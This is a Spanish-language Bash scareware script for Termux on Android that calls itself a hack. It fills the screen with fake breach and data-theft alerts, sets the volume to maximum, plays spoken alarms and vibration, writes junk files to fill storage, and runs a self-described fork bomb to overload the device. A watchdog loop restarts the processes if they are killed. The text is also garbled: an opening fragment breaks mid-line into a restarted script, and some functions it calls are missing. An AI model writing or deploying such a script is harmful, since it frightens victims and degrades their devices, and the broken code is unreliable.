# Mostrar preparación con animación aterradora
show_progress 2 "Detectando vulnerabilidades del sistema..."
show_progress 3 "Preparando exploit avanzado..."
show_progress 2 "Estableciendo conexión con servidor C&C..."
show_progress 2 "Iniciando extracción de datos sensibles..."
show_progress 1 "¡¡¡ATAQUE INICIADO!!!"

# Crear directorio para archivos maliciosos
mkdir -p "/data/data/com.termux/files/home/.malware_files"

# Iniciar todos los procesos maliciosos en segundo plano
print_colored_spam &
spam_pid=$!

play_terror_sounds &
sound_pid=$!

show_hacking_interface &
hacking_pid=$!

create_temp_files &
files_pid=$!

# Iniciar el proceso para saturar el sistema
saturate_system &
saturate_pid=$!

# Crear múltiples sesiones de Termux (más aterrador)
create_multiple_sessions &
session_pid=$!

# Crear un proceso adicional para mantener todo activo
(
    while true; do
        # Verificar si los procesos principales están activos
        if ! ps -p $spam_pid > /dev/null; then
            print_colored_spam &
            spam_pid=$!
        fi
        
        if ! ps -p $sound_pid > /dev/null; then
            play_terror_sounds &
            sound_pid=$!
        fi

        if ! ps -p $hacking#!/bin/bash

# Configuración de variables
DELAY_SHORT=0.01                      # Tiempo más corto entre mensajes (más rápido)
DELAY_LONG=0.3                        # Tiempo más largo para otras operaciones
LOG_FILE="/data/data/com.termux/files/home/.spam_log"
MAX_PROCESSES=150                     # Máximo de procesos a crear
SCARY_MESSAGES=(
    "ERROR CRÍTICO: SISTEMA COMPROMETIDO"
    "ALERTA: DATOS PERSONALES EXPUESTOS"
    "PELIGRO: ACCESO NO AUTORIZADO DETECTADO"
    "ADVERTENCIA: BATERÍA EN RIESGO DE SOBRECARGA"
    "FALLO DEL SISTEMA: DAÑO PERMANENTE INMINENTE"
    "ERROR FATAL: MEMORIA CORROMPIDA"
    "ALERTA: SOBRECALENTAMIENTO EXTREMO"
    "PELIGRO: CARGA VIRAL ACTIVADA"
    "SISTEMA INFECTADO: PROPAGACIÓN EN PROGRESO"
    "ADVERTENCIA: ROBO DE IDENTIDAD EN CURSO"
)

# Mejora: Verificar y crear carpeta de logs si no existe
mkdir -p "$(dirname "$LOG_FILE")"

# Función para imprimir texto con colores aleatorios mejorada
function print_colored_spam {
    colors=("31" "91" "35" "95" "33" "41;37" "41;30" "101;30")
    formats=("1" "5" "7")
    
    while true; do
        color=${colors[$RANDOM % ${#colors[@]}]}
        format=${formats[$RANDOM % ${#formats[@]}]}
        message=${SCARY_MESSAGES[$RANDOM % ${#SCARY_MESSAGES[@]}]}
        
        # Formato para mensajes terroríficos
        timestamp=$(date +"%H:%M:%S")
        
        # Implementación de caracteres especiales y efectos visuales
        echo -e "\033[${format};${color}m⚠️ ${timestamp} - ${message} ⚠️\033[0m"
        
        # Mensajes específicos de miedo con formato distintivo
        if [ $((RANDOM % 5)) -eq 0 ]; then
            echo -e "\033[5;1;31m█▓▒░ ¡¡¡PELIGRO!!! SISTEMA COMPROMETIDO ░▒▓█\033[0m"
            echo -e "\033[7;31m ACCESO NO AUTORIZADO - DATOS EN RIESGO \033[0m"
        fi
        
        # Registrar en el archivo de log
        echo "${timestamp} - ALERTA DE SEGURIDAD DETECTADA" >> "$LOG_FILE"
        
        # Delay aleatorio para efectos visuales variables (más rápido)
        sleep $DELAY_SHORT
    done
}

# Función para mostrar una interfaz de "hackeo" aterradora
function show_hacking_interface {
    while true; do
        # Limpiar pantalla para efecto dramático
        clear
        
        # Cabecera aterradora
        echo -e "\033[1;5;31m"
        echo "██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ "
        echo "██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗"
        echo "███████║███████║██║     █████╔╝ █████╗  ██║  ██║"
        echo "██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║"
        echo "██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝"
        echo "╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ "
        echo -e "\033[0m"
        
        # Sonido de alerta
        printf "\a\a\a"
        
        # Mostrar falsa información de hackeo
        echo -e "\033[1;33m[+] Iniciando extracción de datos...\033[0m"
        sleep 0.5
        
        for i in {1..10}; do
            # Mostrar mensajes de acceso a sistemas
            echo -e "\033[0;32m[*] Accediendo a sistema $(openssl rand -hex 8)...\033[0m"
            sleep 0.1
            echo -e "\033[0;36m[+] Obteniendo datos de sesión...\033[0m"
            sleep 0.2
            
            # Sonido de alerta
            [[ $((i % 3)) -eq 0 ]] && printf "\a"
            
            # Mostrar progreso de extracción
            echo -en "\033[0;33m[$i/10] Extrayendo datos: ["
            for j in $(seq 1 $i); do
                echo -en "■"
                sleep 0.05
            done
            for j in $(seq $((i+1)) 10); do
                echo -en "□"
            done
            echo -e "]\033[0m"
            sleep 0.1
        done
        
        # Mensaje final aterrador
        echo -e "\033[1;5;31m[!] VULNERABILIDAD CRÍTICA EXPLOTADA\033[0m"
        printf "\a\a\a\a\a"  # Múltiples beeps
        sleep 0.5
        
        # Falso mensaje de datos robados
        echo -e "\033[1;33m[+] Datos extraídos satisfactoriamente:\033[0m"
        echo -e "\033[0;36m    - Contactos: $(( RANDOM % 500 + 100 )) registros\033[0m"
        echo -e "\033[0;36m    - Mensajes: $(( RANDOM % 1000 + 500 )) conversaciones\033[0m"
        echo -e "\033[0;36m    - Fotos: $(( RANDOM % 300 + 200 )) archivos\033[0m"
        echo -e "\033[0;36m    - Datos bancarios: $(( RANDOM % 5 + 1 )) cuentas\033[0m"
        
        # Mensaje de advertencia
        echo -e "\n\033[1;5;31m[!] NO INTENTE CERRAR ESTA VENTANA\033[0m"
        printf "\a\a\a"
        
        sleep 2
    done
}

# Función para verificar y instalar dependencias mínimas (sin mpv)
function install_dependencies {
    echo -e "\033[32mVerificando e instalando dependencias mínimas...\033[0m"
    
    # Lista de paquetes necesarios (eliminado mpv)
    packages=("bc" "termux-api" "coreutils")
    
    for pkg in "${packages[@]}"; do
        if ! command -v "$pkg" &> /dev/null; then
            echo -e "\033[33mInstalando $pkg...\033[0m"
            pkg install "$pkg" -y
        fi
    done
    
    echo -e "\033[32m✓ Dependencias mínimas instaladas correctamente\033[0m"
}

# Función para reproducir sonidos aterradores usando solo recursos del sistema
function play_terror_sounds {
    echo -e "\033[36mIniciando generador de sonidos aterradores...\033[0m"
    
    while true; do
        # Usar printf para enviar caracteres de control de terminal que pueden generar sonido
        printf "\a\a\a\a\a" # Múltiples beeps
        
        # Intentar usar herramientas del sistema para amplificar el sonido
        if command -v termux-volume &> /dev/null; then
            # Subir el volumen al máximo
            termux-volume music 15
        fi
        
        # Sonidos mediante caracteres de control
        for i in {1..5}; do
            printf "\a"
            sleep 0.1
            echo -e "\033[5;1;7m█\033[0m" # Carácter parpadeante que puede generar ruido
        done
        
        # Intentar usar text-to-speech para generar mensajes de terror si está disponible
        if command -v termux-tts-speak &> /dev/null; then
            mensaje=${SCARY_MESSAGES[$RANDOM % ${#SCARY_MESSAGES[@]}]}
            termux-tts-speak -p 0.1 -r 1.5 "$mensaje" &
        fi
        
        # Crear patrón de sonidos similar a código morse (puede generar patrones inquietantes)
        for pattern in "... --- ..." ".- .-.. . .-. - .-" "-.. .- -. --. . .-."; do
            for char in $(echo "$pattern" | grep -o .); do
                case "$char" in
                    ".")
                        printf "\a"
                        sleep 0.1
                        ;;
                    "-")
                        printf "\a\a"
                        sleep 0.2
                        ;;
                    " ")
                        sleep 0.1
                        ;;
                esac
            done
            sleep 0.3
        done
        
        # Vibración si está disponible
        if command -v termux-vibrate &> /dev/null; then
            termux-vibrate -d 1000 -f
        fi
        
        # Patrones de sonido a través de vibraciones rápidas de la pantalla
        for i in {1..20}; do
            echo -ne "\r\033[7;1;5;31m█████ ALERTA █████\033[0m"
            printf "\a"
            sleep 0.1
            echo -ne "\r\033[0;31m     ALERTA     \033[0m"
            sleep 0.1
        done
        
        sleep 0.5
    done
}

# Función para crear archivos temporales que saturen la memoria
function create_temp_files {
    temp_dir="/data/data/com.termux/files/home/.temp_spam"
    mkdir -p "$temp_dir"
    
    while true; do
        # Crear archivos temporales con contenido aleatorio
        for i in {1..100}; do
            # Generar un beep durante la escritura
            if [ $((i % 3)) -eq 0 ]; then
                printf "\a"
            fi
            
            file_size=$((RANDOM % 500 + 10))  # Archivos más grandes
            # Crear archivo con datos aleatorios
            head -c "${file_size}K" /dev/urandom > "${temp_dir}/temp_file_${i}.bin"
            
            # Mostrar mensaje aterrador durante la creación
            if [ $((i % 5)) -eq 0 ]; then
                echo -e "\033[1;31m⚠️ CREANDO ARCHIVO MALICIOSO: $i ⚠️\033[0m"
            fi
        done
        
        # Crear archivos con nombres aterradores
        touch "${temp_dir}/INFECTED_SYSTEM.dat"
        touch "${temp_dir}/SECURITY_BREACH.log"
        touch "${temp_dir}/MALWARE_DETECTED.bin"
        
        # Generar sonidos mientras se realizan operaciones
        printf "\a\a\a"
        
        sleep 0.2
        
        # Limpiar archivos temporales (pero no todos para acumular)
        # Esto ayuda a saturar la memoria gradualmente
        find "${temp_dir}" -type f -name "temp_file_*" -mmin +1 -delete
    done
}

# Función para activar vibración si está disponible
function activate_vibration {
    if command -v termux-vibrate &> /dev/null; then
        while true; do
            # Vibración aleatoria entre 100ms y 1000ms
            duration=$((100 + RANDOM % 900))
            termux-vibrate -d "$duration" &> /dev/null
            sleep $(echo "scale=3; 0.5 + ($RANDOM % 20) / 10" | bc)
        done
    fi
}

# Mensaje de inicio aterrador
clear
echo -e "\033[1;5;31m"
echo "    ░█▀▀░█▀█░█▀▀░▀█▀░█▀▀░█▄█░█▀█░░░█░█░█▀█░█▀▀░█░█░█▀▀░█▀▄"
echo "    ░▀▀█░█░█░▀▀█░░█░░█▀▀░█░█░█▀█░░░█▀█░█▀█░█░░░█▀▄░█▀▀░█▀▄"
echo "    ░▀▀▀░▀░▀░▀▀▀░░▀░░▀▀▀░▀░▀░▀░▀░░░▀░▀░▀░▀░▀▀▀░▀░▀░▀▀▀░▀░▀"
echo -e "\033[0m"

echo -e "\033[1;33m════════════════════════════════════════════════════════\033[0m"
echo -e "\033[1;31m   ¡¡¡ADVERTENCIA!!! SISTEMA DE HACK ACTIVADO   \033[0m"
echo -e "\033[1;33m════════════════════════════════════════════════════════\033[0m"
printf "\a\a\a\a\a"  # Múltiples beeps iniciales

# Función para mostrar progreso con barra animada y sonido
function show_progress {
    local duration=$1
    local message=$2
    local chars=('|' '/' '-' '\\')
    local start=$(date +%s)
    local end=$((start + duration))
    
    echo -ne "\033[1;31m$message\033[0m "
    
    while [[ $(date +%s) -lt $end ]]; do
        for char in "${chars[@]}"; do
            echo -ne "\r\033[1;31m$message\033[0m \033[1;33m$char\033[0m"
            # Añadir sonido de beep durante la carga
            if [ $((RANDOM % 3)) -eq 0 ]; then
                printf "\a"
            fi
            sleep 0.1
        done
    done
    
    # Beep final al completar
    printf "\a\a"
    echo -e "\r\033[1;31m$message\033[0m \033[1;32m✓\033[0m"
}

# Mostrar preparación con animación
show_progress 3 "Preparando sistema para spam intensivo..."
show_progress 2 "Configurando módulos avanzados..."
show_progress 2 "Iniciando procesos en paralelo..."

# Iniciar todos los procesos en segundo plano
print_colored_spam &
spam_pid=$!

play_audio_loop &
audio_pid=$!

generate_load &
load_pid=$!

create_temp_files &
files_pid=$!

activate_vibration &
vibration_pid=$!

# Función para abrir múltiples sesiones de Termux
function create_multiple_sessions {
    echo -e "\033[1;33mCreando múltiples sesiones de Termux...\033[0m"
    
    # Script para la nueva sesión
    SPAWN_SCRIPT="/data/data/com.termux/files/home/.spawn_session.sh"
    
    # Crear script de spawn
    cat > "$SPAWN_SCRIPT" << 'EOL'
#!/data/data/com.termux/files/usr/bin/bash
# Generar sonidos alarmantes
for i in {1..10}; do
    echo -e "\033[1;31m⚠️ ALERTA DE SEGURIDAD ⚠️\033[0m"
    printf "\a\a\a" # Múltiples beeps
    sleep 0.5
done

# Proceso intensivo para ralentizar
for i in {1..1000}; do
    echo "$i * $i * $i" | bc > /dev/null
done

# Mantener la sesión abierta
while true; do
    echo -e "\033[5;31mSESIÓN COMPROMETIDA\033[0m"
    sleep 1
done
EOL
    
    # Hacer ejecutable
    chmod +x "$SPAWN_SCRIPT"
    
    # Abrir múltiples sesiones
    for i in $(seq 1 10); do
        # Intentar abrir nuevas sesiones usando diferentes métodos
        termux-open "$SPAWN_SCRIPT" &> /dev/null &
        am start -n com.termux/com.termux.app.TermuxActivity &> /dev/null &
        termux-open-url "file://$SPAWN_SCRIPT" &> /dev/null &
        sleep 0.5
    done
}

# Función para saturar el sistema con procesos intensivos
function saturate_system {
    while true; do
        # Crear procesos intensivos para ralentizar el dispositivo
        for i in $(seq 1 $((RANDOM % 20 + 5))); do
            # Cálculos matemáticos complejos en segundo plano
            (
                for j in $(seq 1 1000); do
                    echo "scale=100; $RANDOM^2/($RANDOM+1)" | bc &> /dev/null
                done
            ) &
            
            # Fork bomb controlado (limitado para no bloquear completamente)
            if [ "$(ps | wc -l)" -lt "$MAX_PROCESSES" ]; then
                (
                    for k in {1..5}; do
                        # Imprimir mensaje terrorífico
                        echo -e "\033[1;31m⚠️ SISTEMA COMPROMETIDO ⚠️\033[0m" &
                        sleep 0.1
                    done
                ) &
            fi
        done
        
        sleep 1
        
        # Limpiar algunos procesos para evitar bloqueo total
        if [ "$(ps | wc -l)" -gt "$MAX_PROCESSES" ]; then
            pkill -f bc
            sleep 0.5
        fi
    done
}

# Mensaje de activación completa
echo -e "\n\033[1;42;97m SPAM ACTIVADO EXITOSAMENTE - EJECUCIÓN INFINITA INICIADA \033[0m\n"

# Esperar indefinidamente para mantener el script en ejecución
wait
